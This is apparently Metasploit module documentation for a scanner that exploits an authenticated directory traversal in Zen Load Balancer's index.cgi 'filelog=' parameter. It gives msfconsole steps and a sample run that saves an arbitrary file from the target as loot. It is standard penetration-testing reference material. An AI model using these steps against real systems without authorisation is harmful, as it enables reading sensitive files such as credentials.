## Description

Zen load balancer before v3.10.1 is vulnerable to authenticated directory traversal. The flaw exists in 'index.cgi' not properly handling 'filelog=' parameter which allows a malicious actor to load arbitrary file path.

## Vulnerable Application

[Vulnerable ISO](https://sourceforge.net/projects/zenloadbalancer/files/Distro/zenloadbalancer-distro_3.10.1.iso/download)

## Verification Steps

1. `./msfconsole -q`
2. `set RHOSTS <rhost>`
3. `set RPORT <rport>`
4. `set FILEPATH <filepath>`
5. `set ssl <true/false>`
6. `set HttpPassword <admin>`
7. `set HttpUsername <admin>`
5. `run`

## Scenarios

```
msf5 > use auxiliary/scanner/http/zenload_balancer_traversal 
msf5 auxiliary(scanner/http/zenload_balancer_traversal) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf5 auxiliary(scanner/http/zenload_balancer_traversal) > set SSL true 
SSL => true
msf5 auxiliary(scanner/http/zenload_balancer_traversal) > run
[*] Running module against 192.168.1.101

[+] File saved in: /Users/Dhiraj/.msf4/loot/20200412142620_default_192.168.1.101_zenload.http_196293.txt
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/http/zenload_balancer_traversal) >
```
